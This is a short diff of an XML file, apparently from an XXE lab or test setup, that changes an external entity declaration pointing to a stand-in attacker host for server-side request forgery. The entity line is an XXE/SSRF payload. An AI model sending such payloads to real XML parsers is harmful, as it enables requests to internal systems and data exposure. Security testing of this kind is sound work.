@@ -2,7 +2,7 @@
 
 <!DOCTYPE Company
 [
-<!ENTITY placeholder SYSTEM "http://attackerserver:8888/ssrf/" >
+<!ENTITY placeholder SYSTEM "http://attackerserver-flaskxxe:8888/ssrf/" >
 ]>
 
 <Company>
